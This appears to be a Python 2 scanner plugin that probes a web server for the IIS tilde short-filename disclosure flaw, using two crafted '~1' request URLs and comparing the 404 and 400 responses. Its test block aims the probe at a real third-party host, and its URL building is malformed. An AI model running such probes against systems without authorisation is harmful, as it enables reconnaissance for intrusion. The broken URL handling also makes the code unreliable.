from ..miniCurl import Curl
from ..t  import T
#!/usr/bin/env python
import urlparse


class P(T):
    def __init__(self):
        T.__init__(self)
    def verify(self,head='',context='',ip='',port='',productname={},keywords='',hackinfo=''):
        arg='http://'+ip+':'+port+'/'
        curl=Curl()
        result = {}
        result['result']=False
        if 'asp' in head:
            url = arg
            code, head, res, errcode, _ = curl.curl(url + '%2F*~1.*%2Fx.aspx')
            if code == 404:
                code, head, res, errcode, _ = curl.curl(url + '%2Fooxx*~1.*%2Fx.aspx')
                if code == 400:
                    output(url,result,'info')
    

        del curl
        return result


def output(url,result,label):
    info = url + '  asp  info '
    result['result']=True
    result['VerifyInfo'] = {}
    result['VerifyInfo']['type']='asp info'
    result['VerifyInfo']['URL'] =url
    result['VerifyInfo']['payload']='/root/github/poccreate/thirdparty/http/www_7b2f2e712d947a7ad946d1d754f62c7a.py'
    result['VerifyInfo']['level']=label
    result['VerifyInfo']['result'] =info

if __name__ == '__main__':

    print P().verify(ip='http://yunlai.cn:803/sfdsfds/',port='80')
    print P().verify(ip='http://yunlai.cn:803/sfdsfds/',port='80')
    print P().verify(ip='http://yunlai.cn:803/sfdsfds/',port='80')

#/root/github/poccreate/thirdparty/www/www_7b2f2e712d947a7ad946d1d754f62c7a.py
#/root/github/poccreate/codesrc/exp-52.py